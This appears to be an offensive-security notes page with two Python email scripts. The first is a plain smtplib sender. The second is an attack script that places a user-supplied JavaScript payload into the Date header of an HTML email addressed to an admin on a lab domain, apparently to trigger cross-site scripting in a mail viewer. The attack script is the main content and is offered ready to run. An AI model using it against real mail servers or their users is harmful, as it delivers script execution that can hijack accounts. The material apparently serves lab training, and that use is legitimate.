## Sending emails with Python

```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText

smtp_ssl_host = '127.0.0.1' 
smtp_ssl_port = 25
sender = 'root@your-mail-domain.com'
targets = ['hacker@example.com']

msg = MIMEText('Hi, how are you today?')
msg['Subject'] = 'Hello'
msg['From'] = sender
msg['To'] = ', '.join(targets)

server = smtplib.SMTP(smtp_ssl_host, smtp_ssl_port)
server.starttls()
result = server.sendmail(sender, targets, msg.as_string())
server.quit()
```


```python
#!/usr/bin/python3

import smtplib
import sys


def sendMail(dstemail, frmemail, smtpsrv, payload):
    msg = "From: attacker@offsec.local\n"
    msg += "To: admin@offsec.local\n"
    msg += f"Date: {payload}\n"
    msg += "Subject: You haz been pwnd lol\n"
    msg += "Content-type: text/html\n\n"
    msg += "lol you been hacked!"
    msg += '\r\n\r\n'

    server = smtplib.SMTP(smtpsrv)

    try:
        server.sendmail(frmemail, dstemail, msg)
        print("[+] Email sent!")

    except Exception as e:
        print("[-] Failed to send email:")
        print(f"[*] {e}")

    server.quit()


dest_email = "admin@offsec.local"
from_email = "attacker@offsec.local"

if not (dest_email and from_email):
    sys.exit()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"(+) usage: {sys.argv[0]} <server> <js payload>")
        sys.exit(-1)

    smtpsrv = sys.argv[1]
    payload = sys.argv[2]

    sendMail(dest_email, from_email, smtpsrv, payload)
```

